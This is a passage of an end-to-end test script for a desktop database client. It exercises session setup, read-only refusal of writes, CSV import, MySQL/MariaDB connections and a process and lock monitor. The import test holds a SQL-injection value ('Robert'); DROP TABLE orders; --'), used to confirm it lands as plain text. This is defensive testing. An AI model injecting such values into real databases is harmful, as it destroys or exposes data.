    await setThemeKeepingDialog("light");
    await runDialog.getByRole("button", { name: "Close", exact: true }).click();
    await runDialog.waitFor({ state: "detached" });
  }

  step("session setup: a default schema and setup statements open tabs in that schema, and a write in it or in the editor is refused on a read-only connection");
  // ADR-037. A schema of its own on the Docker PostgreSQL, made from the tab still open there.
  await replaceQuery(
    panel,
    "drop schema if exists smoke_setup cascade;\ncreate schema smoke_setup;\ncreate table smoke_setup.only_here (id int);\ninsert into smoke_setup.only_here values (42);",
  );
  await run(panel);
  // The DROP is asked about first, as any risky statement (guard.rs).
  const dropSetup = page.getByRole("dialog", { name: "Run these statements?" });
  await dropSetup.getByRole("button", { name: "Run anyway" }).click();
  await dropSetup.waitFor({ state: "detached" });
  await panel.getByText("4 statements: 4 OK", { exact: false }).first().waitFor();
  await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
  {
    let wizard = page.locator(".modal.wizard");
    await wizard.locator(".engine-card", { hasText: "PostgreSQL" }).click();
    await wizard.getByRole("heading", { name: "New PostgreSQL connection" }).waitFor();
    assert.deepEqual(await wizard.getByRole("tab").allTextContents(), ["Main", "SSL", "SSH", "Kubernetes", "Session", "Options"]);
    await wizard.getByLabel("Name", { exact: true }).fill("PG session setup");
    await wizard.getByLabel("Host", { exact: true }).fill("127.0.0.1");
    await wizard.getByLabel("Port", { exact: true }).fill("15432");
    await wizard.getByLabel("Database", { exact: true }).fill("spelaion");
    await wizard.getByLabel("User", { exact: true }).fill("spelaion");
    await wizard.getByRole("checkbox", { name: "Save password" }).uncheck();
    await wizard.getByRole("tab", { name: "Session" }).click();
    // What each engine can set comes from the core: PostgreSQL has a schema and four levels.
    const isolation = wizard.getByLabel("Isolation level", { exact: true });
    assert.deepEqual(await isolation.locator("option").allTextContents(), ["The server's default", "Read uncommitted", "Read committed", "Repeatable read", "Serializable"]);
    const ignoreErrors = wizard.getByRole("checkbox", { name: "Ignore errors in these statements" });
    assert.ok(await ignoreErrors.isDisabled(), "nothing to ignore without setup statements");
    await wizard.getByLabel("Default schema", { exact: true }).fill("smoke_setup");
    await isolation.selectOption("repeatable-read");
    await wizard.getByLabel("Run when a session opens", { exact: true }).fill("SET search_path TO smoke_setup, public;\nSET TIME ZONE 'UTC';");
    assert.ok(!(await ignoreErrors.isDisabled()));
    await shot("sdb-14-session-tab");
    await wizard.getByRole("tab", { name: "Options" }).click();
    await wizard.getByRole("radio", { name: "Personal", exact: true }).check();
    await wizard.getByRole("button", { name: "Save", exact: true }).click();
    await wizard.waitFor({ state: "detached" });
    await page.locator(".connection-row", { hasText: "PG session setup" }).waitFor();
    const saved = readFileSync(join(userDir, "connections", "pg-session-setup.toml"), "utf8");
    assert.match(saved, /\[session\]/);
    assert.match(saved, /schema = "smoke_setup"/);
    assert.match(saved, /isolation = "repeatable-read"/);
    assert.match(saved, /SET TIME ZONE 'UTC';/);

    // The tab opens in that schema, with the setup's settings: unqualified names are found there.
    const setupPanel = await newQuery(
      "PG session setup",
      "select id, current_schema() as in_schema, current_setting('TimeZone') as tz, current_setting('transaction_isolation') as iso from only_here;",
    );
    await run(setupPanel);
    await page.getByRole("dialog").getByText("Password for PG session setup").waitFor();
    await page.getByLabel("Password", { exact: true }).fill("spelaion");
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    await setupPanel.locator(".statusline", { hasText: "1 row" }).waitFor();
    const schemaPicker = setupPanel.getByRole("combobox", { name: "Schema", exact: true });
    await page.waitForFunction(() => document.querySelector('.tab-panel:not([hidden]) select[name="schema"]')?.value === "smoke_setup");
    assert.ok((await schemaPicker.locator("option").allTextContents()).includes("public"));
    // The setup's SELECTs and SETs are not the user's queries: no setup error banner, no extra results.
    assert.equal(await setupPanel.locator(".setup-skipped").count(), 0);
    await shot("sdb-14-schema-picker");
    // Switching the picker changes only this tab's session.
    await schemaPicker.selectOption("public");
    await page.waitForFunction(() => document.querySelector('.tab-panel:not([hidden]) select[name="schema"]')?.value === "public");
    await replaceQuery(setupPanel, "select current_schema() as in_schema;");
    await run(setupPanel);
    await setupPanel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await schemaPicker.selectOption("smoke_setup");
    await page.waitForFunction(() => document.querySelector('.tab-panel:not([hidden]) select[name="schema"]')?.value === "smoke_setup");

    // A setup statement that writes is refused on a read-only connection, before anything is saved.
    await (await connectionMenu("PG session setup")).getByRole("menuitem", { name: "Edit…" }).click();
    wizard = page.locator(".modal.wizard");
    await wizard.getByRole("heading", { name: "Edit PG session setup" }).waitFor();
    await wizard.getByRole("tab", { name: "Options" }).click();
    await wizard.getByRole("checkbox", { name: "Read-only", exact: true }).check();
    await wizard.getByRole("tab", { name: "Session" }).click();
    await wizard.getByText("may only read and change session settings", { exact: false }).waitFor();
    // Its label wraps it, so its accessible name includes the text it holds: found by name.
    const setupBox = wizard.locator('textarea[name="sessionSetup"]');
    assert.equal(await setupBox.inputValue(), "SET search_path TO smoke_setup, public;\nSET TIME ZONE 'UTC';");
    await setupBox.fill("SET search_path TO smoke_setup, public;\ninsert into smoke_setup.only_here values (1);");
    await wizard.getByRole("checkbox", { name: "Ignore errors in these statements" }).check();
    await wizard.getByRole("button", { name: "Save changes" }).click();
    await wizard.locator(".test-result .error", { hasText: "statement 2 of 2 cannot run on this session" }).waitFor();
    await shot("sdb-14-refused-on-read-only");
    await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
    await wizard.waitFor({ state: "detached" });
    assert.doesNotMatch(readFileSync(join(userDir, "connections", "pg-session-setup.toml"), "utf8"), /insert into/);

    // A read-only connection refuses a write typed in the editor (ADR-053): before anything
    // runs, without asking first (it could not run anyway), naming the statement.
    await (await connectionMenu("PG session setup")).getByRole("menuitem", { name: "Edit…" }).click();
    wizard = page.locator(".modal.wizard");
    await wizard.getByRole("heading", { name: "Edit PG session setup" }).waitFor();
    await wizard.getByRole("tab", { name: "Options" }).click();
    await wizard.getByRole("checkbox", { name: "Read-only", exact: true }).check();
    await wizard.getByRole("button", { name: "Save changes" }).click();
    await wizard.waitFor({ state: "detached" });
    assert.match(readFileSync(join(userDir, "connections", "pg-session-setup.toml"), "utf8"), /read_only = true/);
    const readOnlyPanel = await newQuery("PG session setup", "select id from only_here;\ndelete from only_here;");
    await run(readOnlyPanel);
    const readOnlyPassword = page.getByRole("dialog").getByText("Password for PG session setup");
    const refusal = readOnlyPanel.locator(".error-box", { hasText: "the connection is read-only, so nothing was run" });
    await Promise.race([readOnlyPassword.waitFor(), refusal.waitFor()]);
    if (await readOnlyPassword.isVisible()) {
      await page.getByLabel("Password", { exact: true }).fill("spelaion");
      await page.getByRole("button", { name: "Connect", exact: true }).click();
    }
    await refusal.waitFor();
    await readOnlyPanel.locator(".error-box", { hasText: 'statement 2, "delete from only_here"' }).waitFor();
    assert.equal(await page.getByRole("dialog", { name: "Run these statements?" }).count(), 0);
    await shot("sdb-131-write-refused");
    await setTheme("dark", "dark");
    await refusal.waitFor();
    await shot("sdb-131-write-refused-dark");
    await setTheme("light", "light");
    // Nothing ran: the row is still there, and reads still run.
    await replaceQuery(readOnlyPanel, "select id from only_here;");
    await run(readOnlyPanel);
    await readOnlyPanel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await page.locator(".tabbar .tab.active .close").click();
    // Writable again, so the cleanup below can drop the schema.
    await (await connectionMenu("PG session setup")).getByRole("menuitem", { name: "Edit…" }).click();
    wizard = page.locator(".modal.wizard");
    await wizard.getByRole("heading", { name: "Edit PG session setup" }).waitFor();
    await wizard.getByRole("tab", { name: "Options" }).click();
    await wizard.getByRole("checkbox", { name: "Read-only", exact: true }).uncheck();
    await wizard.getByRole("button", { name: "Save changes" }).click();
    await wizard.waitFor({ state: "detached" });
    assert.doesNotMatch(readFileSync(join(userDir, "connections", "pg-session-setup.toml"), "utf8"), /read_only = true/);

    // Leave the run as it was: the schema, the tab and the connection go.
    await replaceQuery(setupPanel, "drop schema smoke_setup cascade;");
    await run(setupPanel);
    const dropSchema = page.getByRole("dialog", { name: "Run these statements?" });
    await dropSchema.getByRole("button", { name: "Run anyway" }).click();
    await dropSchema.waitFor({ state: "detached" });
    await setupPanel.locator(".editor-action-cancel").waitFor({ state: "detached" });
    await setupPanel.getByText("Statement 1: OK", { exact: false }).first().waitFor();
    await page.locator(".tabbar .tab.active .close").click();
    await page.locator(".connection-row", { hasText: "PG session setup" }).waitFor();
    await (await connectionMenu("PG session setup")).getByRole("menuitem", { name: "Delete…" }).click();
    const deleteSetup = page.getByRole("dialog", { name: "Delete connection?" });
    await deleteSetup.getByRole("button", { name: "Delete", exact: true }).click();
    await deleteSetup.waitFor({ state: "detached" });
    await page.locator(".connection-row", { hasText: "PG session setup" }).waitFor({ state: "detached" });
  }

  step("import: a CSV into a new table, with its preview, columns and SQL shown first");
  {
    // ADR-038. A value made of quotes and SQL must arrive as plain text.
    const csvPath = join(userDir, "smoke-import.csv");
    const tricky = `Robert'); DROP TABLE orders; -- "quoted"`;
    writeFileSync(
      csvPath,
      [
        "id,name,amount,day,note",
        "1,plain,10.50,2024-01-31,x",
        `2,"${tricky.replaceAll('"', '""')}",3,2024-02-29,`,
        `3,"two\nlines",7.25,2024-03-01,y`,
        "",
      ].join("\r\n"),
    );
    const mainSchema = page.getByRole("button", { name: "Expand or collapse schema main" });
    await mainSchema.waitFor();
    await mainSchema.click({ button: "right" });
    await page.getByRole("menuitem", { name: "Import data into a new table…" }).click();
    const dialog = page.getByRole("dialog", { name: "Import data" });
    await dialog.waitFor();
    await page.evaluate((path) => { window.__spelaionOpenPath = path; }, csvPath);
    await dialog.getByRole("button", { name: "Choose file…" }).click();
    const preview = dialog.getByRole("region", { name: "Preview" });
    await preview.locator("tbody tr").nth(2).waitFor();
    await page.evaluate(() => { delete window.__spelaionOpenPath; });
    // The core's types: integer, decimal and date; mixed or missing values are text.
    assert.deepEqual(await preview.locator("th .import-kind").allTextContents(), ["Integer", "Text", "Decimal", "Date", "Text"]);
    await dialog.getByText("Types detected from 3 rows.").waitFor();
    // The note column is left out.
    await preview.getByRole("button", { name: "Leave out note" }).click();
    await preview.getByRole("button", { name: "Import note again" }).waitFor();
    await shot("sdb-10-preview");
    await dialog.getByRole("button", { name: "Next", exact: true }).click();
    assert.equal(await dialog.locator('input[name="import-table"]').inputValue(), "smoke_import");
    const mapping = dialog.getByRole("region", { name: "Columns" });
    assert.equal(await mapping.locator("tbody tr").count(), 4);
    assert.equal(await mapping.getByRole("textbox", { name: "Type of the column for amount" }).inputValue(), "NUMERIC");
    await shot("sdb-10-mapping");
    await dialog.getByRole("button", { name: "Review SQL…" }).click();
    const sql = dialog.locator(".import-sql");
    await sql.waitFor();
    const text = await sql.innerText();
    // SQLite's quoting leaves plain names as they are.
    assert.ok(text.startsWith("CREATE TABLE smoke_import (\n  id INTEGER,\n  name TEXT,\n  amount NUMERIC,\n  day DATE\n)"), text);
    assert.ok(text.endsWith("INSERT INTO smoke_import (id, name, amount, day) VALUES (?, ?, ?, ?)"), text);
    await shot("sdb-10-review");
    await dialog.getByRole("button", { name: "Import", exact: true }).click();
    await dialog.getByText(/^Imported 3 rows into smoke_import in /).waitFor();
    await shot("sdb-10-done");
    await dialog.getByRole("button", { name: "Open table" }).click();
    await dialog.waitFor({ state: "detached" });
    await page.locator(".tabbar .tab.active", { hasText: "smoke_import" }).waitFor();
    await page.locator(".tab-panel:not([hidden]) .statusline", { hasText: "3 rows" }).waitFor();
    await page.keyboard.press("Control+w");
    await page.locator(".tabbar .tab.active", { hasText: "smoke_import" }).waitFor({ state: "detached" });

    // The tricky value arrived as text; then the table goes again.
    const check = await newQuery("Shop (SQLite)", `select id from smoke_import where name = '${tricky.replaceAll("'", "''")}' and amount = 3;`);
    await run(check);
    await check.locator(".statusline", { hasText: "1 row" }).waitFor();
    await replaceQuery(check, "drop table smoke_import;");
    await run(check);
    const dropImported = page.getByRole("dialog", { name: "Run these statements?" });
    await dropImported.getByRole("button", { name: "Run anyway" }).click();
    await dropImported.waitFor({ state: "detached" });
    await check.getByText("Statement 1: OK", { exact: false }).first().waitFor();
    await page.locator(".tabbar .tab.active .close").click();
  }

  step("MySQL and MariaDB: password, TLS, types and the schema explorer");
  // Only an encrypted session has a cipher: the row exists only if TLS is on.
  for (const [connection, version, status] of [
    ["MySQL (Docker)", /8\.4\./, "performance_schema.session_status"],
    ["MariaDB (Docker)", /MariaDB/, "information_schema.session_status"],
  ]) {
    panel = await newQuery(
      connection,
      `select 42 as answer, 'text ñ €' as txt, cast('2026-01-31' as date) as day, variable_value as cipher
from ${status}
where variable_name = 'Ssl_cipher' and variable_value <> '';`,
    );
    await panel.getByRole("button", { name: "Connect to choose database" }).click();
    await page.getByRole("dialog").getByText(`Password for ${connection}`).waitFor();
    await page.getByLabel("Password", { exact: true }).fill("spelaion");
    await page.getByRole("button", { name: "Connect", exact: true }).click();
    const database = panel.getByLabel("Database", { exact: true });
    await database.locator('option[value="information_schema"]').waitFor({ state: "attached" });
    await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await database.elementHandle());
    await run(panel);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    assert.match(await panel.locator(".status-connected").innerText(), version);
    if (connection.startsWith("MySQL")) await shot("07b-mysql");
    await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await database.elementHandle());
    await database.selectOption("information_schema");
    await page.waitForFunction((el) => !el.disabled && el.value === "information_schema", await database.elementHandle());
    await replaceQuery(panel, "select 1 where database() = 'information_schema';");
    let previousResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
    await run(panel);
    await page.waitForFunction((el) => !el.isConnected, previousResult);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await page.waitForFunction((el) => !el.disabled, await database.elementHandle());
    await replaceQuery(panel, "use spelaion; select 1 where database() = 'spelaion';");
    previousResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
    await run(panel);
    await page.waitForFunction((el) => !el.isConnected, previousResult);
    await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
    await page.waitForFunction((el) => !el.disabled && el.value === "spelaion", await database.elementHandle());
  }
  step("a grid read on one connection is read-only once the tab moves to another, and nothing is written there");
  {
    const shown = page.locator(".tab-panel:not([hidden])");
    const activeTab = page.locator(".tabbar .tab.active");
    const keptTab = await activeTab.locator(".tab-label").innerText();
    const asked = (connection) => page.getByRole("dialog").getByText(`Password for ${connection}`);
    const logIn = async (connection) => {
      await asked(connection).waitFor();
      await page.getByLabel("Password", { exact: true }).fill("spelaion");
      await page.getByRole("button", { name: "Connect", exact: true }).click();
      await asked(connection).waitFor({ state: "detached" });
    };
    // The same table and key on both servers, with different names in row 1.
    for (const [connection, value] of [["MariaDB (Docker)", "mariadb"], ["MySQL (Docker)", "mysql"]]) {
      await newQuery(connection, `create table if not exists spelaion.sdb137 (id int primary key, name varchar(20)); delete from spelaion.sdb137 where id = 1; insert into spelaion.sdb137 values (1, '${value}');`);
      await run(shown);
      await logIn(connection);
      await shown.getByText("Statement 3: 1 row", { exact: false }).waitFor();
      if (connection === "MariaDB (Docker)") await activeTab.locator(".close").click();
    }
    const readTab = await activeTab.locator(".tab-label").innerText();
    await replaceQuery(shown, "select id, name from spelaion.sdb137;");
    await run(shown);
    await shown.getByRole("button", { name: "Add row" }).waitFor();
    // The tab moves to MariaDB. Run asks for a value after connecting there; cancelled, the
    // rows read on MySQL stay on screen with the tab connected to MariaDB.
    const connectionList = shown.locator(".toolbar select").first();
    const mariadb = await connectionList.locator("option", { hasText: "MariaDB (Docker) (" }).first().getAttribute("value");
    await connectionList.selectOption(mariadb);
    await shown.getByRole("button", { name: "Add row" }).waitFor({ state: "detached" });
    await replaceQuery(shown, "select :marker;");
    await run(shown);
    await logIn("MariaDB (Docker)");
    const values = page.getByRole("dialog", { name: "Query parameters" });
    await values.waitFor();
    await values.getByRole("button", { name: "Cancel", exact: true }).click();
    await values.waitFor({ state: "detached" });
    await activeTab.locator(".dot-connected").waitFor();
    // The editability check runs again on MariaDB's session: the core says no.
    await page.waitForTimeout(1_000);
    assert.equal(await shown.getByRole("button", { name: "Add row" }).count(), 0, "the grid stays read-only");
    await shown.locator("span.muted", { hasText: /^Read-only$/ }).first().waitFor();
    const box = await shown.locator(".grid-scroller").boundingBox();
    await page.mouse.dblclick(box.x + 52 + 110 + 20, box.y + 34 + 12);
    await page.waitForTimeout(300);
    assert.equal(await shown.locator("input.cell-editor").count(), 0, "a cell of the old rows cannot be edited");
    await shot("12a3-connection-changed-read-only-light");
    await page.evaluate(() => { document.documentElement.dataset.theme = "dark"; });
    await shot("12a3-connection-changed-read-only-dark");
    await page.evaluate(() => { document.documentElement.dataset.theme = "light"; });
    // Nothing was written on either server.
    // Two rows only if row 1 still has MariaDB's name (the grid on screen has one row).
    await replaceQuery(shown, "select n from (select 1 as n union all select 2) v where exists (select 1 from spelaion.sdb137 where id = 1 and name = 'mariadb');");
    await run(shown);
    await shown.locator(".statusline", { hasText: "2 rows" }).waitFor();
    await activeTab.locator(".close").click();
    await page.locator(".tabbar .tab", { hasText: readTab }).waitFor({ state: "detached" });
    await page.locator(".tabbar .tab .tab-label", { hasText: keptTab }).first().click();
    await page.locator(".tabbar .tab.active", { hasText: keptTab }).waitFor();
    const mysqlCheck = await newQuery("MySQL (Docker)", "select n from (select 1 as n union all select 2) v where exists (select 1 from spelaion.sdb137 where id = 1 and name = 'mysql');");
    await run(mysqlCheck);
    await logIn("MySQL (Docker)");
    await mysqlCheck.locator(".statusline", { hasText: "2 rows" }).waitFor();
    await activeTab.locator(".close").click();
    await page.locator(".tabbar .tab .tab-label", { hasText: keptTab }).first().click();
    await page.locator(".tabbar .tab.active", { hasText: keptTab }).waitFor();
  }
  step("process monitor: independent connection, filtering and SQL details");
  const currentSqlBeforeMonitor = await panel.locator(".cm-content").innerText();
  await activities.getByRole("button", { name: "Processes", exact: true }).click();
  const processSidebar = page.locator("#processes-sidebar");
  assert.ok(await processSidebar.getByRole("button", { name: /Shop \(SQLite\)/ }).isDisabled());
  await processSidebar.getByRole("button", { name: "MySQL (Docker)", exact: true }).click();
  const monitor = page.getByRole("region", { name: "Processes", exact: true });
  await monitor.locator(".process-table tbody tr").first().waitFor();
  assert.ok(await monitor.locator(".process-table tbody tr").count() >= 1);
  await monitor.locator(".process-table tbody tr:has(.process-own)").click();
  await monitor.getByText("This is the monitoring connection.", { exact: true }).waitFor();
  assert.ok(await monitor.getByRole("button", { name: "End connection" }).isDisabled());
  assert.ok(await monitor.getByRole("button", { name: "Cancel query" }).isDisabled());
  // The process-control command accepts the structured target and must reject calls that
  // have not passed the confirmation step. This uses an isolated test session.
  const unconfirmedError = await page.evaluate(async () => {
    const invoke = window.__TAURI_INTERNALS__.invoke;
    const connection = (await invoke("list_connections")).find((item) => item.name === "MySQL (Docker)");
    const session = "e2e-process-confirmation";
    try {
      const outcome = await invoke("connect", { session, connection: connection.id, password: "spelaion", remember: false, editor: false });
      if (outcome.kind !== "connected") throw new Error(`unexpected connection outcome: ${outcome.kind}`);
      const snapshot = await invoke("list_processes", { session });
      const row = snapshot.processes.find((item) => item.id === snapshot.ownId);
      const target = { id: row.id, user: row.user, host: row.host, command: row.command, sql: row.sql, identity: row.identity };
      try {
        await invoke("control_process", { session, target, terminate: true, confirmed: false });
        return "no error";
      } catch (error) { return String(error); }
    } finally {
      await invoke("disconnect", { session });
    }
  });
  assert.match(unconfirmedError, /confirmation is required/);
  await monitor.getByLabel("Search processes…").fill("no-such-process-marker");
  await monitor.getByText("No processes match these filters.").waitFor();
  await monitor.getByLabel("Search processes…").fill("");
  await monitor.getByLabel("Database", { exact: true }).selectOption({ label: "No database" });
  await monitor.getByLabel("Database", { exact: true }).selectOption("");
  await monitor.getByLabel("Auto refresh").selectOption("5");
  await monitor.getByLabel("Auto refresh").selectOption("0");
  await monitor.getByRole("button", { name: "Refresh", exact: true }).click();
  await monitor.locator(".process-table tbody tr").first().waitFor();
  await shot("07b-process-monitor");
  await processSidebar.getByRole("button", { name: "MariaDB (Docker)", exact: true }).click();
  await monitor.getByRole("heading", { name: "MariaDB (Docker)" }).waitFor();
  await monitor.locator(".process-table tbody tr:has(.process-own)").waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0, "the monitor reuses the connected tab's credentials");
  await processSidebar.getByRole("button", { name: "Postgres (Docker)", exact: true }).click();
  await monitor.getByRole("heading", { name: "Postgres (Docker)" }).waitFor();
  await monitor.locator(".process-table tbody tr:has(.process-own)").click();
  await monitor.getByText("PostgreSQL may truncate the SQL it reports.").waitFor();
  assert.ok(await monitor.getByRole("button", { name: "End connection" }).isDisabled());
  await monitor.getByLabel("State", { exact: true }).selectOption("idle");
  await monitor.locator(".process-table tbody tr").first().waitFor();
  assert.equal(await page.getByRole("dialog").count(), 0, "PostgreSQL credentials are reused");
  step("process monitor: locks, who blocks whom, and the server's settings");
  await monitor.getByLabel("State", { exact: true }).selectOption("all");
  // Two psql sessions in the PostgreSQL container: one holds a row lock, the other waits for it.
  const psql = (sql) => ["compose", "-f", join(root, "testing/docker/compose.yaml"), "exec", "-T", "postgres", "psql", "-U", "spelaion", "-d", "spelaion", "-X", "-q", "-c", sql];
  execFileSync("docker", psql("DROP TABLE IF EXISTS smoke_locks; CREATE TABLE smoke_locks (id int PRIMARY KEY, v int); INSERT INTO smoke_locks VALUES (1, 1);"), { stdio: "ignore" });
  const lockHolder = spawn("docker", psql("BEGIN; UPDATE smoke_locks SET v = 10 WHERE id = 1; SELECT pg_sleep(120); ROLLBACK;"), { stdio: "ignore" });
  await page.waitForTimeout(1500);
  const lockWaiter = spawn("docker", psql("UPDATE smoke_locks SET v = 20 WHERE id = 1;"), { stdio: "ignore" });
  try {
    await monitor.getByRole("radio", { name: "Locks", exact: true }).click();
    const chains = monitor.getByRole("list", { name: "Who blocks whom" });
    const refreshMonitor = monitor.getByRole("button", { name: "Refresh", exact: true });
    // The waiter needs a moment to reach the lock: refresh until the pair shows.
    for (let i = 0; i < 30 && (await chains.count()) === 0; i++) {
      await page.waitForTimeout(500);
      await refreshMonitor.click();
    }
    const head = chains.locator("li").first();
    await head.getByText("Blocks 1 session", { exact: true }).waitFor();
    await chains.locator("li").nth(1).getByText(/^Waiting/).waitFor();
    const lockTable = monitor.locator(".process-table");
    await lockTable.locator("tbody tr", { hasText: "public.smoke_locks" }).first().waitFor();
    await lockTable.locator("tbody tr:has(.lock-status.waiting)").first().waitFor();
    await head.getByRole("button").click();
    const lockDetails = monitor.getByRole("complementary", { name: "Lock details" });
    await lockDetails.locator(".process-sql-detail", { hasText: "pg_sleep(120)" }).waitFor();
    // Ending the blocking session goes through the process monitor's checks and confirmation.
    assert.ok(!(await lockDetails.getByRole("button", { name: "End connection" }).isDisabled()), "the blocking session can be ended from here");
    await shot("07c-lock-view");
    await setTheme("dark", "dark");
    await head.getByText("Blocks 1 session", { exact: true }).waitFor();
    await shot("07c-lock-view-dark");
    await setTheme("light", "light");
    await lockTable.locator("tbody tr:has(.lock-status.waiting)").first().click();
    await lockDetails.getByText("Waiting for", { exact: true }).waitFor();
    await monitor.getByLabel("Show", { exact: true }).selectOption("waiting");
    assert.equal(await lockTable.locator("tbody tr:has(.lock-status.granted)").count(), 0, "only waiting locks");
    await monitor.getByLabel("Show", { exact: true }).selectOption("all");
    await monitor.getByLabel("Search locks…").fill("no-such-lock-marker");
    await monitor.getByText("No locks match these filters.").waitFor();
    await monitor.getByLabel("Search locks…").fill("");

    await monitor.getByRole("radio", { name: "Settings", exact: true }).click();
    const settingsTable = monitor.locator(".settings-table");
    await settingsTable.locator("tbody tr", { hasText: "max_connections" }).first().waitFor();
    await monitor.getByLabel("Search settings…").fill("shared_buffers");
    await settingsTable.locator("tbody tr").first().waitFor();
    await settingsTable.locator("tbody tr", { hasText: "shared_buffers" }).first().click();
    const settingDetails = monitor.getByRole("complementary", { name: "Setting details" });
    await settingDetails.locator(".process-sql-detail", { hasText: /^\d+[kMG]B$/ }).waitFor();
    await settingDetails.getByText(/shared memory buffers/i).waitFor();
    await monitor.getByLabel("Search settings…").fill("");
    await shot("07d-server-settings");
    await monitor.getByLabel("Search settings…").fill("no-such-setting-marker");
    await monitor.getByText("No settings match this search.").waitFor();
    await monitor.getByLabel("Search settings…").fill("");
    await monitor.getByRole("radio", { name: "Processes", exact: true }).click();
    await monitor.locator(".process-table tbody tr:has(.process-own)").waitFor();
  } finally {
    lockHolder.kill();
    lockWaiter.kill();
    execFileSync("docker", psql("SELECT pg_terminate_backend(pid) FROM pg_stat_activity WHERE query LIKE '%smoke_locks%' AND pid <> pg_backend_pid(); DROP TABLE IF EXISTS smoke_locks;"), { stdio: "ignore" });
  }
  await activities.getByRole("button", { name: "Connections", exact: true }).click();
  assert.equal(await panel.locator(".cm-content").innerText(), currentSqlBeforeMonitor);
  // SQLyog-style column filters on SHOW FULL PROCESSLIST (no WHERE possible there).
  panel = await newQuery("MySQL (Docker)", "show full processlist;");
  await run(panel);
  await page.getByRole("dialog").getByText("Password for MySQL (Docker)").waitFor();
  await page.getByLabel("Password", { exact: true }).fill("spelaion");
  await page.getByRole("button", { name: "Connect", exact: true }).click();
  await panel.locator(".statusline", { hasText: /\d+ rows? ·/ }).waitFor();
  const processlistTotal = Number((await panel.locator(".statusline").innerText()).match(/(\d+) rows?/)[1]);
  // The filter bar moves the grid down: its box is read before every right-click.
  const rightClickFirstCell = async () => {
    const box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(box.x + 80, box.y + 34 + 12, { button: "right" });
  };
  const filterBy = async (op, value) => {
    await rightClickFirstCell();
    await panel.getByRole("menuitem", { name: "Filter ▸" }).hover();
    await panel.getByRole("menuitem", { name: "Custom filter…" }).click();
    const dialog = page.getByRole("dialog", { name: "Custom filter" });
    await dialog.getByLabel("Column").selectOption({ label: "Command" });
    await dialog.getByLabel("Operator").selectOption({ label: op });
    await dialog.getByLabel("Value").fill(value);
    await dialog.getByRole("button", { name: "Filter", exact: true }).click();
    await dialog.waitFor({ state: "detached" });
  };
  const shownOf = async () => {
    const text = await panel.locator(".statusline").innerText();
    const m = text.match(/(\d+) of (\d+) rows?/);
    return m ? [Number(m[1]), Number(m[2])] : null;
  };
  await filterBy("<>", "Sleep");
  await panel.locator(".filter-chip", { hasText: "Command <> 'Sleep'" }).waitFor();
  await panel.locator(".statusline", { hasText: " of " }).waitFor();
  const [busy, total] = await shownOf();
  assert.equal(total, processlistTotal);
  assert.ok(busy >= 1, "this query is running");
  await shot("07c-processlist-filtered");
  await panel.getByRole("button", { name: "Remove the filter Command <> 'Sleep'" }).click();
  await panel.locator(".filter-chip").waitFor({ state: "detached" });
  await filterBy("=", "sleep");
  await panel.locator(".filter-chip", { hasText: "Command = 'sleep'" }).waitFor();
  await panel.locator(".statusline", { hasText: " of " }).waitFor();
  const [sleeping] = await shownOf();
  assert.equal(sleeping + busy, processlistTotal);
  // From the cell's own menu: the filter for its value, then reset.
  await rightClickFirstCell();
  await panel.getByRole("menuitem", { name: "Filter ▸" }).hover();
  await panel.getByRole("menuitem", { name: /^Id <> \d+$/ }).click();
  await panel.locator(".filter-chip").nth(1).waitFor();
  await panel.getByRole("button", { name: "Reset filters" }).click();
  await panel.locator(".filter-chip").first().waitFor({ state: "detached" });
  await panel.locator(".statusline", { hasText: `${processlistTotal} row` }).waitFor();

  step("MySQL query pages: block fetching while there are unsaved edits");
  const pageValues = Array.from({ length: 230 }, (_, i) => `(${i + 1})`).join(", ");
  await replaceQuery(panel, `create table if not exists smoke_pages (id int primary key); delete from smoke_pages where id > 0; insert into smoke_pages values ${pageValues};`);
  await run(panel);
  await panel.getByText("Statement 3: 230 rows", { exact: false }).waitFor();
  await replaceQuery(panel, "select * from smoke_pages order by id;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "230 rows" }).waitFor();
  let mysqlPages = panel.getByRole("group", { name: "Query result pages" });
  const firstMysqlResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await mysqlPages.getByLabel("Rows per page").selectOption("100");
  await page.waitForFunction((el) => !el.isConnected, firstMysqlResult);
  await panel.locator(".statusline", { hasText: "100 rows" }).waitFor();
  await panel.getByRole("button", { name: "Add row" }).waitFor();
  const mysqlGrid = panel.locator(".grid-scroller");
  const mysqlBox = await mysqlGrid.boundingBox();
  await page.mouse.dblclick(mysqlBox.x + 52 + 20, mysqlBox.y + 34 + 12);
  await panel.locator("input.cell-editor").and(panel.getByRole("textbox", { name: "New value for id" })).fill("901");
  await panel.locator("input.cell-editor").and(panel.getByRole("textbox", { name: "New value for id" })).press("Enter");
  assert.ok(await mysqlPages.getByLabel("Rows per page").isDisabled());
  await mysqlGrid.evaluate((el) => { el.scrollTop = el.scrollHeight; });
  await page.waitForTimeout(300);
  await panel.locator(".statusline", { hasText: "100 rows" }).waitFor();
  await panel.getByRole("button", { name: "Discard" }).click();
  await mysqlGrid.evaluate((el) => { el.scrollTop = 0; });
  await mysqlGrid.evaluate((el) => { el.scrollTop = el.scrollHeight; });
  await panel.locator(".statusline", { hasText: "200 rows" }).waitFor();
  await mysqlPages.getByRole("button", { name: "Count", exact: true }).click();
  await mysqlPages.getByText(/of 230/).waitFor();

  // A table of the test server to edit (never the demo database).
  await replaceQuery(
    panel,
    "create table if not exists smoke_edit (id int primary key, name varchar(20), qty int default 1);\n" +
      "delete from smoke_edit where id > 0;\n" +
      "insert into smoke_edit values (1, 'one', 1), (2, 'two', 2), (3, 'three', 3);",
  );
  await run(panel);
  await panel.getByText("Statement 3: 3 rows", { exact: false }).waitFor();

  // The explorer lists MySQL databases and their tables.
  // Its own session ("ask every time"): the password is asked again.
  await page.locator('.connection-row:has-text("MySQL (Docker)") .twisty').click();
